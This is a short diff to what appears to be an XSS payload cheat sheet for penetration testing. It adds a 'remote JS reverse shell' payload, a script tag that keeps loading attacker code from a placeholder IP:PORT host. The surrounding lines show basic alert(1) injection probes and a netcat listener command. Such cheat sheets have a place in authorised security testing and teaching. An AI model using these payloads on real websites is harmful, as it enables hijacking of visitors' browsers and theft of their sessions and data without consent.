@@ -36,6 +36,9 @@ XSS. Try it on URL query, fragment & path. All input fields.
 \'-alert(1)//
 javascript:alert(1)
 </pre>
+A remote JS reverse shell payload
+<pre>&lt;script&gt;setInterval(function(){d=document;z=d.createElement("script");z.src="//IP:PORT";d.body.appendChild(z)},0)&lt;/script&gt;
+</pre>
 Reverse check request by nc
 <pre>nc -lvvp 1333
 </pre>
